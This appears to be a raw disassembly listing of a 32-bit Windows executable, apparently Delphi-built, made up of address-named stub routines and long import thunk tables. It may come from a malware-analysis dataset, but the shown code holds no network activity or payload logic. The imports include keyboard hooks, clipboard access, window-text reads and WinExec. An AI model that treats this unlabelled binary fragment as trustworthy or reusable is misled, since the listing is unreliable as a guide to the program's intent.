sub_404bbc
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_402910
call [ rw-data ]
retn
sub_404cc0
mov ecx 0x1
jmp sub_404bd4
sub_404cca
retn
sub_404ccc
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_402910
call [ rw-data ]
retn
sub_404ef2
retn
sub_404ef4
push edx
call sub_4027b4
pop edx
test eax eax
je r-xdata
retn
push eax
call sub_404b7c
pop eax
sub_404f08
push eax
call sub_404cc0
pop eax
call sub_4027d4
retn
sub_404f18
xchg ecx eax
xchg edx ecx
call sub_40427c
retn
sub_404f6c
mov al 0x11
jmp sub_402910
sub_404f97
retn
sub_4051d8
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_404e00
pop ebp
retn 0x4
j_sub_404bd4
jmp sub_404bd4
sub_4051ed
retn
sub_4051f0
call sub_4054a4
retn
sub_405530
call sub_405508
retn
sub_405879
jmp sub_403b24
sub_4059e4
call sub_4059f4
retn
sub_4059ec
call sub_405a14
retn
sub_4059f4
push ebx
mov ebx eax
mov eax 0x8
call sub_4027b4
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
pop ebx
retn
sub_405aaf
jmp sub_403870
sub_405ad0
mov edx [ rw-data ]
mov [ eax ] edx
mov [ rw-data ] eax
retn
sub_405b44
jmp sub_403b24
sub_405b4b
pop ecx
pop ebp
retn
sub_405bc4
test eax eax
je r-xdata
retn
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
sub_405bd0
add eax 0x4
push eax
call InterlockedDecrement
retn
sub_405bdc
cmp [ eax + 0x4 ] 0x0
je r-xdata
retn
mov al 0x2
call sub_402910
sub_405bec
call sub_403328
mov [ eax + 0x4 ] 0x1
retn
sub_405c24
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add eax 0x4
push eax
call InterlockedIncrement
pop ebp
retn 0x4
sub_405c60
test eax eax
jns r-xdata
retn
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
mov al 0x18
jmp sub_402910
mov edx [ esp ]
call ecx
sub_405f2f
jmp sub_403b24
sub_405f36
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405fd3
jmp sub_403b24
sub_405fda
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_406023
jmp sub_403b24
sub_40602a
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4060ee
jmp sub_403b24
sub_4060f5
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_406146
jmp sub_403b24
sub_40614d
pop ebp
retn
sub_406224
jmp [ __import_lookup_table_4(kernel32:GetModuleHandleA) ]
LocalAlloc
jmp [ LocalAlloc@IAT ]
TlsSetValue
jmp [ TlsSetValue@IAT ]
sub_406244
push eax
push 0x40
call LocalAlloc
retn
sub_406250
mov eax 0x10
retn
sub_4062dc
mov eax rw-data
call sub_405ad0
retn
sub_406351
jmp sub_403b24
sub_406358
pop ebp
retn
sub_40635c
sub [ rw-data ] 0x1
retn
sub_406364
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] ecx
pop ebx
pop ebp
retn 0x8
sub_406380
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
retn
sub_406388
test eax eax
je r-xdata
xor eax eax
retn
add [ eax ] edx
add [ eax + 0x8 ] edx
add [ eax + 0x4 ] ecx
add [ eax + 0xc ] ecx
mov al 0x1
retn
sub_4063e1
jmp sub_403b24
sub_4063e8
pop ebp
retn
sub_4063ec
sub [ rw-data ] 0x1
retn
sub_4063f4
clc
arpl [ eax ] ax
add eax [ edx ]
xor [ cs : 0x0 ] eax
or al 0x0
add [ eax ] al
hlt
RegCloseKey
jmp [ __import_lookup_table_5(advapi32:RegCloseKey) ]
RegOpenKeyExA
jmp [ RegOpenKeyExA@IAT ]
RegQueryValueExA
jmp [ RegQueryValueExA@IAT ]
CompareStringA
jmp [ CompareStringA@IAT ]
CreateFileA
jmp [ __import_lookup_table_6(kernel32:CreateFileA) ]
CreateThread
jmp [ __import_lookup_table_6(kernel32:CreateThread) ]
FindResourceA
jmp [ FindResourceA@IAT ]
FormatMessageA
jmp [ FormatMessageA@IAT ]
InterlockedExchange
jmp [ InterlockedExchange@IAT ]
FreeResource
jmp [ __import_lookup_table_6(kernel32:FreeResource) ]
GetACP
jmp [ GetACP@IAT ]
GetCPInfo
jmp [ __import_lookup_table_6(kernel32:GetCPInfo) ]
GetComputerNameA
jmp [ GetComputerNameA@IAT ]
GetCurrentProcessId
jmp [ GetCurrentProcessId@IAT ]
GetDateFormatA
jmp [ __import_lookup_table_6(kernel32:GetDateFormatA) ]
GetDiskFreeSpaceA
jmp [ __import_lookup_table_6(kernel32:GetDiskFreeSpaceA) ]
GetFileSize
jmp [ __import_lookup_table_6(kernel32:GetFileSize) ]
GetFullPathNameA
jmp [ GetFullPathNameA@IAT ]
GetLocalTime
jmp [ GetLocalTime@IAT ]
GetLocaleInfoA
jmp [ __import_lookup_table_6(kernel32:GetLocaleInfoA) ]
GetModuleHandleA
jmp [ __import_lookup_table_6(kernel32:GetModuleHandleA) ]
GetStringTypeExA
jmp [ __import_lookup_table_6(kernel32:GetStringTypeExA) ]
GetSystemInfo
jmp [ __import_lookup_table_6(kernel32:GetSystemInfo) ]
GetTempPathA
jmp [ __import_lookup_table_6(kernel32:GetTempPathA) ]
GetUserDefaultLCID
jmp [ GetUserDefaultLCID@IAT ]
GetVersion
jmp [ __import_lookup_table_6(kernel32:GetVersion) ]
GetVersionExA
jmp [ GetVersionExA@IAT ]
GlobalAlloc
jmp [ GlobalAlloc@IAT ]
GlobalFindAtomA
jmp [ GlobalFindAtomA@IAT ]
GlobalFree
jmp [ GlobalFree@IAT ]
GlobalLock
jmp [ GlobalLock@IAT ]
GlobalHandle
jmp [ __import_lookup_table_6(kernel32:GlobalHandle) ]
GlobalReAlloc
jmp [ __import_lookup_table_6(kernel32:GlobalReAlloc) ]
GlobalSize
jmp [ __import_lookup_table_6(kernel32:GlobalSize) ]
GlobalUnlock
jmp [ __import_lookup_table_6(kernel32:GlobalUnlock) ]
LeaveCriticalSection
jmp [ LeaveCriticalSection@IAT ]
LoadLibraryA
jmp [ LoadLibraryA@IAT ]
LoadResource
jmp [ __import_lookup_table_6(kernel32:LoadResource) ]
LockResource
jmp [ LockResource@IAT ]
ReadFile
jmp [ __import_lookup_table_6(kernel32:ReadFile) ]
ResetEvent
jmp [ __import_lookup_table_6(kernel32:ResetEvent) ]
SetEndOfFile
jmp [ SetEndOfFile@IAT ]
SetEvent
jmp [ SetEvent@IAT ]
SetFilePointer
jmp [ SetFilePointer@IAT ]
SetThreadLocale
jmp [ SetThreadLocale@IAT ]
SizeofResource
jmp [ __import_lookup_table_6(kernel32:SizeofResource) ]
sub_4066d0
jmp [ __import_lookup_table_6(kernel32:Sleep) ]
VirtualAlloc
jmp [ __import_lookup_table_6(kernel32:VirtualAlloc) ]
VirtualQuery
jmp [ __import_lookup_table_6(kernel32:VirtualQuery) ]
WaitForSingleObject
jmp [ __import_lookup_table_6(kernel32:WaitForSingleObject) ]
WinExec
jmp [ __import_lookup_table_6(kernel32:WinExec) ]
lstrcpyA
jmp [ lstrcpyA@IAT ]
GetFileVersionInfoA
jmp [ __import_lookup_table_7(version:GetFileVersionInfoA) ]
GetFileVersionInfoSizeA
jmp [ GetFileVersionInfoSizeA@IAT ]
VerQueryValueA
jmp [ VerQueryValueA@IAT ]
CloseEnhMetaFile
jmp [ __import_lookup_table_8(gdi32:CloseEnhMetaFile) ]
CopyEnhMetaFileA
jmp [ CopyEnhMetaFileA@IAT ]
CreateBitmap
jmp [ CreateBitmap@IAT ]
CreateBrushIndirect
jmp [ CreateBrushIndirect@IAT ]
CreateDIBSection
jmp [ __import_lookup_table_8(gdi32:CreateDIBSection) ]
CreateDIBitmap
jmp [ __import_lookup_table_8(gdi32:CreateDIBitmap) ]
CreateEnhMetaFileA
jmp [ CreateEnhMetaFileA@IAT ]
CreateHalftonePalette
jmp [ CreateHalftonePalette@IAT ]
CreatePalette
jmp [ CreatePalette@IAT ]
CreatePen
jmp [ CreatePen@IAT ]
CreatePenIndirect
jmp [ CreatePenIndirect@IAT ]
DeleteEnhMetaFile
jmp [ __import_lookup_table_8(gdi32:DeleteEnhMetaFile) ]
ExcludeClipRect
jmp [ ExcludeClipRect@IAT ]
GetBrushOrgEx
jmp [ GetBrushOrgEx@IAT ]
GetClipBox
jmp [ GetClipBox@IAT ]
GetCurrentPositionEx
jmp [ __import_lookup_table_8(gdi32:GetCurrentPositionEx) ]
GetDCOrgEx
jmp [ GetDCOrgEx@IAT ]
GetDIBColorTable
jmp [ GetDIBColorTable@IAT ]
GetEnhMetaFileHeader
jmp [ GetEnhMetaFileHeader@IAT ]
GetPixel
jmp [ __import_lookup_table_8(gdi32:GetPixel) ]
GetTextExtentPoint32A
jmp [ __import_lookup_table_8(gdi32:GetTextExtentPoint32A) ]
GetWindowOrgEx
jmp [ __import_lookup_table_8(gdi32:GetWindowOrgEx) ]
LPtoDP
jmp [ __import_lookup_table_8(gdi32:LPtoDP) ]
LineTo
jmp [ __import_lookup_table_8(gdi32:LineTo) ]
MaskBlt
jmp [ __import_lookup_table_8(gdi32:MaskBlt) ]
MoveToEx
jmp [ __import_lookup_table_8(gdi32:MoveToEx) ]
PlayEnhMetaFile
jmp [ PlayEnhMetaFile@IAT ]
Polyline
jmp [ Polyline@IAT ]
RectVisible
jmp [ RectVisible@IAT ]
Rectangle
jmp [ Rectangle@IAT ]
SelectClipRgn
jmp [ __import_lookup_table_8(gdi32:SelectClipRgn) ]
SetAbortProc
jmp [ SetAbortProc@IAT ]
SetBrushOrgEx
jmp [ __import_lookup_table_8(gdi32:SetBrushOrgEx) ]
SetDIBColorTable
jmp [ SetDIBColorTable@IAT ]
SetEnhMetaFileBits
jmp [ SetEnhMetaFileBits@IAT ]
SetMapMode
jmp [ SetMapMode@IAT ]
SetPixel
jmp [ __import_lookup_table_8(gdi32:SetPixel) ]
SetROP2
jmp [ SetROP2@IAT ]
SetViewportOrgEx
jmp [ SetViewportOrgEx@IAT ]
SetWindowOrgEx
jmp [ SetWindowOrgEx@IAT ]
UnrealizeObject
jmp [ UnrealizeObject@IAT ]
ActivateKeyboardLayout
jmp [ ActivateKeyboardLayout@IAT ]
AdjustWindowRectEx
jmp [ AdjustWindowRectEx@IAT ]
CharLowerA
jmp [ __import_lookup_table_9(user32:CharLowerA) ]
BeginPaint
jmp [ __import_lookup_table_9(user32:BeginPaint) ]
BringWindowToTop
jmp [ BringWindowToTop@IAT ]
CallNextHookEx
jmp [ __import_lookup_table_9(user32:CallNextHookEx) ]
CallWindowProcA
jmp [ __import_lookup_table_9(user32:CallWindowProcA) ]
CharLowerBuffA
jmp [ __import_lookup_table_9(user32:CharLowerBuffA) ]
CharNextA
jmp [ __import_lookup_table_9(user32:CharNextA) ]
CharToOemA
jmp [ __import_lookup_table_9(user32:CharToOemA) ]
CharUpperBuffA
jmp [ __import_lookup_table_9(user32:CharUpperBuffA) ]
CheckMenuItem
jmp [ __import_lookup_table_9(user32:CheckMenuItem) ]
ClientToScreen
jmp [ ClientToScreen@IAT ]
CreateIcon
jmp [ __import_lookup_table_9(user32:CreateIcon) ]
CreateMenu
jmp [ __import_lookup_table_9(user32:CreateMenu) ]
CreatePopupMenu
jmp [ __import_lookup_table_9(user32:CreatePopupMenu) ]
DefFrameProcA
jmp [ __import_lookup_table_9(user32:DefFrameProcA) ]
DefMDIChildProcA
jmp [ __import_lookup_table_9(user32:DefMDIChildProcA) ]
DefWindowProcA
jmp [ __import_lookup_table_9(user32:DefWindowProcA) ]
DestroyIcon
jmp [ DestroyIcon@IAT ]
DestroyMenu
jmp [ __import_lookup_table_9(user32:DestroyMenu) ]
DestroyWindow
jmp [ __import_lookup_table_9(user32:DestroyWindow) ]
DispatchMessageA
jmp [ __import_lookup_table_9(user32:DispatchMessageA) ]
DrawFrameControl
jmp [ __import_lookup_table_9(user32:DrawFrameControl) ]
DrawIcon
jmp [ DrawIcon@IAT ]
DrawIconEx
jmp [ DrawIconEx@IAT ]
DrawMenuBar
jmp [ DrawMenuBar@IAT ]
EnableScrollBar
jmp [ EnableScrollBar@IAT ]
EnableWindow
jmp [ __import_lookup_table_9(user32:EnableWindow) ]
EndPaint
jmp [ __import_lookup_table_9(user32:EndPaint) ]
EnumThreadWindows
jmp [ __import_lookup_table_9(user32:EnumThreadWindows) ]
EnumWindows
jmp [ EnumWindows@IAT ]
EqualRect
jmp [ __import_lookup_table_9(user32:EqualRect) ]
FindWindowA
jmp [ __import_lookup_table_9(user32:FindWindowA) ]
GetClassNameA
jmp [ __import_lookup_table_9(user32:GetClassNameA) ]
GetClientRect
jmp [ __import_lookup_table_9(user32:GetClientRect) ]
GetClipboardData
jmp [ GetClipboardData@IAT ]
GetCursor
jmp [ GetCursor@IAT ]
GetDC
jmp [ __import_lookup_table_9(user32:GetDC) ]
GetDCEx
jmp [ __import_lookup_table_9(user32:GetDCEx) ]
GetForegroundWindow
jmp [ GetForegroundWindow@IAT ]
GetIconInfo
jmp [ GetIconInfo@IAT ]
GetKeyNameTextA
jmp [ GetKeyNameTextA@IAT ]
GetKeyboardLayout
jmp [ __import_lookup_table_9(user32:GetKeyboardLayout) ]
GetKeyboardLayoutList
jmp [ __import_lookup_table_9(user32:GetKeyboardLayoutList) ]
GetKeyboardState
jmp [ __import_lookup_table_9(user32:GetKeyboardState) ]
GetLastActivePopup
jmp [ __import_lookup_table_9(user32:GetLastActivePopup) ]
GetMenu
jmp [ __import_lookup_table_9(user32:GetMenu) ]
GetMenuItemID
jmp [ __import_lookup_table_9(user32:GetMenuItemID) ]
GetMenuItemInfoA
jmp [ __import_lookup_table_9(user32:GetMenuItemInfoA) ]
GetMenuStringA
jmp [ __import_lookup_table_9(user32:GetMenuStringA) ]
GetMessageTime
jmp [ GetMessageTime@IAT ]
__imp_GetWindow
jmp [ GetWindow@IAT ]
GetParent
jmp [ GetParent@IAT ]
GetPropA
jmp [ GetPropA@IAT ]
GetScrollInfo
jmp [ GetScrollInfo@IAT ]
GetScrollPos
jmp [ GetScrollPos@IAT ]
GetScrollRange
jmp [ GetScrollRange@IAT ]
GetSubMenu
jmp [ GetSubMenu@IAT ]
GetSysColor
jmp [ GetSysColor@IAT ]
GetSysColorBrush
jmp [ GetSysColorBrush@IAT ]
GetSystemMenu
jmp [ __import_lookup_table_9(user32:GetSystemMenu) ]
GetTopWindow
jmp [ __import_lookup_table_9(user32:GetTopWindow) ]
GetWindow
jmp [ GetWindow@IAT ]
GetWindowDC
jmp [ GetWindowDC@IAT ]
GetWindowPlacement
jmp [ __import_lookup_table_9(user32:GetWindowPlacement) ]
GetWindowRect
jmp [ __import_lookup_table_9(user32:GetWindowRect) ]
GetWindowTextA
jmp [ __import_lookup_table_9(user32:GetWindowTextA) ]
__imp_GetWindowThreadProcessId
jmp [ __import_lookup_table_9(user32:GetWindowThreadProcessId) ]
GetWindowThreadProcessId
jmp [ __import_lookup_table_9(user32:GetWindowThreadProcessId) ]
InsertMenuItemA
jmp [ __import_lookup_table_9(user32:InsertMenuItemA) ]
IsChild
jmp [ IsChild@IAT ]
IsDialogMessageA
jmp [ IsDialogMessageA@IAT ]
IsRectEmpty
jmp [ IsRectEmpty@IAT ]
IsWindow
jmp [ IsWindow@IAT ]
IsWindowEnabled
jmp [ IsWindowEnabled@IAT ]
IsZoomed
jmp [ IsZoomed@IAT ]
KillTimer
jmp [ KillTimer@IAT ]
LoadBitmapA
jmp [ __import_lookup_table_9(user32:LoadBitmapA) ]
LoadIconA
jmp [ LoadIconA@IAT ]
LoadStringA
jmp [ LoadStringA@IAT ]
MapVirtualKeyA
jmp [ __import_lookup_table_9(user32:MapVirtualKeyA) ]
MessageBoxA
jmp [ __import_lookup_table_9(user32:MessageBoxA) ]
OemToCharA
jmp [ __import_lookup_table_9(user32:OemToCharA) ]
PeekMessageA
jmp [ __import_lookup_table_9(user32:PeekMessageA) ]
PostQuitMessage
jmp [ __import_lookup_table_9(user32:PostQuitMessage) ]
PtInRect
jmp [ __import_lookup_table_9(user32:PtInRect) ]
RedrawWindow
jmp [ __import_lookup_table_9(user32:RedrawWindow) ]
RegisterClassA
jmp [ RegisterClassA@IAT ]
RegisterClipboardFormatA
jmp [ RegisterClipboardFormatA@IAT ]
ReleaseCapture
jmp [ ReleaseCapture@IAT ]
ReleaseDC
jmp [ ReleaseDC@IAT ]
RemoveMenu
jmp [ RemoveMenu@IAT ]
ScrollWindow
jmp [ __import_lookup_table_9(user32:ScrollWindow) ]
SetActiveWindow
jmp [ __import_lookup_table_9(user32:SetActiveWindow) ]
SetCapture
jmp [ __import_lookup_table_9(user32:SetCapture) ]
SetClassLongA
jmp [ __import_lookup_table_9(user32:SetClassLongA) ]
SetForegroundWindow
jmp [ __import_lookup_table_9(user32:SetForegroundWindow) ]
SetMenuItemInfoA
jmp [ SetMenuItemInfoA@IAT ]
SetParent
jmp [ SetParent@IAT ]
SetScrollInfo
jmp [ __import_lookup_table_9(user32:SetScrollInfo) ]
SetScrollPos
jmp [ __import_lookup_table_9(user32:SetScrollPos) ]
SetScrollRange
jmp [ SetScrollRange@IAT ]
SetTimer
jmp [ __import_lookup_table_9(user32:SetTimer) ]
SetWindowPlacement
jmp [ SetWindowPlacement@IAT ]
SetWindowTextA
jmp [ __import_lookup_table_9(user32:SetWindowTextA) ]
SetWindowsHookExA
jmp [ __import_lookup_table_9(user32:SetWindowsHookExA) ]
ShowCursor
jmp [ __import_lookup_table_9(user32:ShowCursor) ]
ShowOwnedPopups
jmp [ ShowOwnedPopups@IAT ]
ShowScrollBar
jmp [ ShowScrollBar@IAT ]
TrackPopupMenu
jmp [ TrackPopupMenu@IAT ]
TranslateMDISysAccel
jmp [ TranslateMDISysAccel@IAT ]
TranslateMessage
jmp [ TranslateMessage@IAT ]
UnhookWindowsHookEx
jmp [ __import_lookup_table_9(user32:UnhookWindowsHookEx) ]
UnregisterClassA
jmp [ UnregisterClassA@IAT ]
UpdateWindow
jmp [ __import_lookup_table_9(user32:UpdateWindow) ]
ValidateRect
jmp [ ValidateRect@IAT ]
WaitMessage
jmp [ __import_lookup_table_9(user32:WaitMessage) ]
WinHelpA
jmp [ WinHelpA@IAT ]
WindowFromPoint
jmp [ __import_lookup_table_9(user32:WindowFromPoint) ]
sub_406e8c
call GetTickCount
retn
sub_406e94
xchg edx eax
call sub_4029b0
retn
sub_406e9c
xor eax eax
retn
sub_406ea0
push edx
push eax
call GlobalAlloc
push eax
call GlobalLock
retn
sub_406eb0
push ecx
push edx
push eax
call GlobalHandle
push eax
push eax
call GlobalUnlock
call GlobalReAlloc
push eax
call GlobalLock
retn
sub_406ecc
push eax
call GlobalHandle
push eax
push eax
call GlobalUnlock
call GlobalFree
retn
sub_406ee0
shl edx 0x8
and edx 0xff000000
or eax edx
retn
sub_406f18
call sub_406e80
retn
CreateWindowExA
jmp [ CreateWindowExA@IAT ]
sub_4070f5
jmp sub_403b24
sub_4070fc
pop ebp
retn
sub_407100
sub [ rw-data ] 0x1
retn
sub_40712d
jmp sub_403b24
sub_407134
pop ebp
retn
sub_407138
sub [ rw-data ] 0x1
retn
sub_407488
sub [ rw-data ] 0x1
retn
sub_407f55
add eax 0xffffffd4
jmp sub_40d67c
sub_407f67
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405c24
sub_408048
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd00
call sub_403b5c
pop ebx
retn
sub_408320
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4082e8
test eax eax
sete al
pop esi
pop ebx
retn
sub_408501
jmp sub_403b24
sub_408508
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4089c0
call sub_40899c
retn
sub_408a58
push eax
call CloseHandle
retn
sub_408c28
mov edx edi
mov edi eax
mov ecx 0xffffffff
xor al al
[ edi ]
lea eax [ edi - 0x1 ]
mov edi edx
retn
sub_408c3c
push esi
mov esi eax
xchg edx eax
call sub_4029b0
mov eax esi
pop esi
retn
sub_408dfc
push ebx
mov ebx eax
add ebx 0x4
mov eax ebx
call sub_4027b4
mov [ eax ] ebx
add eax 0x4
pop ebx
retn
sub_408e10
sub eax 0x4
mov eax [ eax ]
sub eax 0x4
retn
sub_408e48
test eax eax
je r-xdata
retn
sub eax 0x4
mov edx [ eax ]
call sub_4027d4
sub_408eb0
push ebx
mov ecx [ rw-data ]
cmp [ ecx ] 0x0
je r-xdata
mov al 0x10
call sub_402910
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
pop ebx
retn
sub_408ed4
push ebx
mov ebx eax
mov eax ebx
call sub_404120
pop ebx
retn
sub_409237
push ebx
push eax
lea eax [ ebp - 0x14 ]
mov ebx [ ebp - 0x4 ]
call sub_404120
pop eax
pop ebx
retn
sub_4094ef
cmp [ ebp - 0x2a ] 0x0
je r-xdata
retn
mov al 0x2d
stosb [ edi ]
sub_40964a
push esi
mov esi [ ebp - 0xc ]
test esi esi
je r-xdata
pop esi
retn
mov ecx [ esi - 0x4 ]
[ edi ] [ esi ]
sub_4099a7
lodsb [ esi ]
or al al
je r-xdata
dec esi
retn
cmp al 0x20
je sub_4099a7
sub_409aa0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4045e0
mov edx esi
xor ecx ecx
call sub_4098f0
pop esi
pop ebx
retn
sub_409b14
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4045e0
mov edx esi
mov cl 0x1
call sub_4098f0
pop esi
pop ebx
retn
sub_40a1fe
jmp sub_403b24
sub_40a205
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a2f6
jmp sub_403b24
sub_40a2fd
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40aaa1
jmp sub_403b24
sub_40aaa8
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40ab30
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
call sub_40aad4
pop ebp
retn 0x8
sub_40ac75
jmp sub_403b24
sub_40ac7c
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_40b11f
jmp sub_403b24
sub_40b126
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b63f
jmp sub_403b24
sub_40b646
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b6f1
jmp sub_403b24
sub_40b6f8
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_40b79b
jmp sub_403b24
sub_40b7a2
pop esi
pop ecx
pop ebp
retn
sub_40b97e
jmp sub_403b24
sub_40b985
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b9dc
test eax eax
je r-xdata
retn
sub eax 0x1000
sub_40bc38
mov eax [ rw-data ]
call sub_403b5c
retn
sub_40bcda
jmp sub_403b24
sub_40bda8
jmp sub_403b24
sub_40be18
cmp [ eax + 0xc ] 0x0
je r-xdata
retn
call sub_403344
sub_40bf14
pop ebx
retn
sub_40bfb4
jmp sub_403b24
sub_40bfbb
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40bfc4
mov esp ecx
mov [ esp ] edx
mov ebp [ ebp ]
jmp sub_403b5c
sub_40bfd1
retn
sub_40bfd4
push ebp
mov ebp esp
call sub_40bf18
lea ecx [ ebp + 0x8 ]
add ecx 0x4
mov edx [ ebp + 0x8 ]
call sub_40bfc4
pop ebp
retn 0x4
sub_40bff0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd00
call sub_403b5c
retn
sub_40c088
push ebx
mov ebx eax
mov eax ebx
call sub_40c008
and eax 0xff
mov eax [ eax * 8 + rw-data ]
pop ebx
retn
sub_40c25b
jmp sub_403b24
sub_40c262
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40c327
jmp sub_403b24
sub_40c32e
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_40c338
call sub_40bb70
mov eax 0x1
call sub_404108
sub_40c4bc
cmp eax [ rw-data ]
jl r-xdata
mov al 0x1
retn
cmp eax [ rw-data ]
jne r-xdata
xor eax eax
retn
cmp edx [ rw-data ]
jle r-xdata
sub_40c595
jmp sub_403b24
sub_40c5b2
jmp sub_403b24
sub_40c5b9
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40c664
xor ecx ecx
cmp [ rw-data ] 0x0
je r-xdata
mov eax ecx
retn
call sub_40c5c8
mov ecx eax
sub_40c850
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
pop ebx
retn
push ebx
call CharNextA
sub eax ebx
pop ebx
retn
sub_40c870
push eax
call CharNextA
retn
sub_40cb94
jmp sub_403b24
sub_40cb9b
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_40cc04
mov eax [ rw-data ]
cmp eax 0x1f
ja r-xdata
setb al
retn
bt [ rw-data ] eax
sub_40d05b
jmp sub_403b24
sub_40d062
pop ebx
mov esp ebp
pop ebp
retn
sub_40d22b
jmp sub_403b24
sub_40d232
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
Sleep
jmp [ Sleep@IAT ]
sub_40d2d4
jmp sub_403b24
sub_40d2db
pop ebx
mov esp ebp
pop ebp
retn
sub_40d2e0
push ebx
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_40d244
sub_40d2f0
push ebx
mov al 0x1
mov ebx [ rw-data ]
jmp r-xdata
test al al
je r-xdata
pop ebx
retn
test ebx ebx
jne r-xdata
call [ ebx + 0x4 ]
mov ebx [ ebx ]
sub_40d30c
push ebx
mov ebx rw-data
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov edx [ eax ]
mov [ ebx ] edx
mov edx 0x8
call sub_4027d4
pop ebx
retn
sub_40d394
mov edx 0xffffffff
xchg edx eax
[ edx ] eax
dec eax
retn
sub_40d3a0
xchg [ eax ] edx
mov eax edx
retn
sub_40d400
push ebp
mov ebp esp
push ecx
call GetCurrentThreadId
mov [ ebp - 0x2 ] ax
mov al [ ebp - 0x2 ]
xor al [ ebp - 0x1 ]
and al 0xf
pop ecx
pop ebp
retn
sub_40d490
mov eax [ edx ]
xor ecx ecx
mov [ eax + 0x4 ] ecx
mov eax [ edx ]
xor edx edx
mov [ eax + 0x8 ] edx
retn
sub_40d5a8
mov eax [ eax + 0x10 ]
push eax
call SetEvent
retn
sub_40d5d0
mov edx [ eax + 0x18 ]
push edx
mov eax [ eax + 0x14 ]
push eax
call WaitForSingleObject
retn
sub_40d84b
jmp sub_403b24
sub_40d852
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_40d8c0
jmp sub_403b24
sub_40d8c7
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d8e5
mov eax [ ebp - 0xc ]
push eax
call SetErrorMode
retn
sub_40d8de
jmp sub_403b24
sub_40d8e5
mov eax [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40dd35
jmp sub_403b24
sub_40dd3c
pop ebp
retn
sub_40dda8
jmp sub_403b24
sub_40ddaf
pop ebp
retn
VariantCopyInd
jmp [ __import_lookup_table_11(oleaut32:VariantCopyInd) ]
VariantChangeType
jmp [ __import_lookup_table_11(oleaut32:VariantChangeType) ]
sub_40de30
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0x10
sub_40de96
jmp sub_403b24
sub_40de9d
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40df02
jmp sub_403b24
sub_40df09
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40df6e
jmp sub_403b24
sub_40df75
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40dfda
jmp sub_403b24
sub_40dfe1
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40e046
jmp sub_403b24
sub_40e04d
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40e0c5
jmp sub_403b24
sub_40e0cc
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x10
sub_40e138
jmp sub_403b24
sub_40e13f
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x14
sub_40e1a8
jmp sub_403b24
sub_40e1af
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x14
sub_40e21c
jmp sub_403b24
sub_40e223
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
SafeArrayCreate
jmp [ __import_lookup_table_11(oleaut32:SafeArrayCreate) ]
SafeArrayGetLBound
jmp [ __import_lookup_table_11(oleaut32:SafeArrayGetLBound) ]
SafeArrayGetUBound
jmp [ SafeArrayGetUBound@IAT ]
SafeArrayAccessData
jmp [ SafeArrayAccessData@IAT ]
SafeArrayUnaccessData
jmp [ SafeArrayUnaccessData@IAT ]
SafeArrayGetElement
jmp [ SafeArrayGetElement@IAT ]
SafeArrayPutElement
jmp [ SafeArrayPutElement@IAT ]
sub_40e5c9
jmp sub_403b24
sub_40e5d0
pop ebp
retn
sub_40e5d4
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_40e298
sub_40e5e5
add [ esp + 0x4 ] 0xfffffff8
